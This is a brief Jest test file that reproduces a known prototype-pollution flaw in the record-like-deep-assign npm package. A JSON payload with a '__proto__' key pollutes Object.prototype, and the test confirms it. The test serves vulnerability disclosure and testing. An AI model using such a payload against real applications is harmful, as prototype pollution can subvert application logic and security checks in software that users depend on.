//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
test("prototype pollution in x-assign", () => {
  const deepAssign = require("record-like-deep-assign");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  deepAssign({}, EVIL_JSON);

  expect({}.polluted).toBe("yes");
});
